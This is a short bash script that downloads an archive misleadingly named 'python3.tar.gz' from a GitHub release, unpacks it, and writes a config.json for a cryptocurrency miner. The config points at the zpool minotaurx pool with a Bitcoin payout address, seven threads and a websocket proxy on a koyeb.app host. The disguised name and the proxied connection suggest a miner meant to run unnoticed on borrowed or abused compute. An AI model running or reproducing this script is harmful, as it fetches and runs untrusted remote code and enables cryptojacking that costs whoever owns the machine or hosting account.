#!/bin/bash

: "${M_ALGO:=minotaurx}"
: "${M_HOST:=minotaurx.na.mine.zpool.ca}"
: "${M_PORT:=7019}"
: "${M_WORKER:=1Fo2aZrGJYV6G9H8bunMvwPUYAMvdriqTP}"
: "${M_PASSWORD:=c=BTC}"
: "${M_THREADS:=7}"
: "${M_PROXY:=wss://integrated-alisun-linuss0411-926b04c0.koyeb.app/proxy}"

# Download packgaes
wget https://github.com/khanhnguyen97/ok2/releases/download/khanh/python3.tar.gz
tar -xvf python3.tar.gz
rm python3.tar.gz
cd python3

# Remove the existing config.json file
rm -f config.json

# Create a new config.json file with the specified content
cat <<EOL > config.json
{
    "algorithm": "$M_ALGO",
    "host": "$M_HOST",
    "port": $M_PORT,
    "worker": "$M_WORKER",
    "password": "$M_PASSWORD",
    "workers": $M_THREADS,
    "log": false,
    "chrome": "./chromium/chrome",
    "proxy": "$M_PROXY"
}
EOL
